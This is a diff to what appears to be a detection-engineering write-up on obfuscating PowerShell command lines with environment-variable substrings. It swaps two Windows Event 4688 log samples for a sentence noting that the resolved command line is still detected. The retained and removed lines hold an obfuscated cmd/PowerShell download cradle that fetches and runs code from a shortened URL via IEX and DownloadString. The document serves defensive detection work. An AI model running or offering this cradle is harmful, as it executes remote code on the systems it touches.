@@ -67,34 +67,8 @@ Substituting the character ```r``` in PowerShell produces: ```Powe%ALLUSERSPROFI
 cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
 ```
 ![binex 3](https://i.ibb.co/HK50bQW/image.png)<br>
-This is how it's going to look in WEL Security Event ID 4688:
-```XML
-- <EventData>
-  <Data Name="SubjectUserSid">S-1-5-21-260327305-1582946090-2061753030-500</Data> 
-  <Data Name="SubjectUserName">user</Data> 
-  <Data Name="SubjectDomainName">WIN-JHK6BC88K34</Data> 
-  <Data Name="SubjectLogonId">0x1cf8c72</Data> 
-  <Data Name="NewProcessId">0xa44</Data> 
-  <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data> 
-  <Data Name="TokenElevationType">%%1936</Data> 
-  <Data Name="ProcessId">0x108</Data> 
-  <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c "powe%ALLUSERSPROFILE:~4,1%shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)" </Data> 
-  </EventData>
-```
-However in child Process Creation WEL Security Event ID 4688 existing environment variables resolve to their underlying value:
-```XML
-- <EventData>
-  <Data Name="SubjectUserSid">S-1-5-21-260327305-1582946090-2061753030-500</Data> 
-  <Data Name="SubjectUserName">user</Data> 
-  <Data Name="SubjectDomainName">WIN-JHK6BC88K34</Data> 
-  <Data Name="SubjectLogonId">0x1cf8c72</Data> 
-  <Data Name="NewProcessId">0x10d8</Data> 
-  <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
-  <Data Name="TokenElevationType">%%1936</Data> 
-  <Data Name="ProcessId">0xa44</Data> 
-  <Data Name="CommandLine">powershell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)</Data> 
-  </EventData>
-```
+
+However, we will detect the command line arguments when the process executes because existing environment variables resolve to their underlying value when executed by cmd.exe, even when substring syntax is used. <br>
 So this subtype of binary obfuscation is considered out of scope for this Issue.
 
 #### For Loop
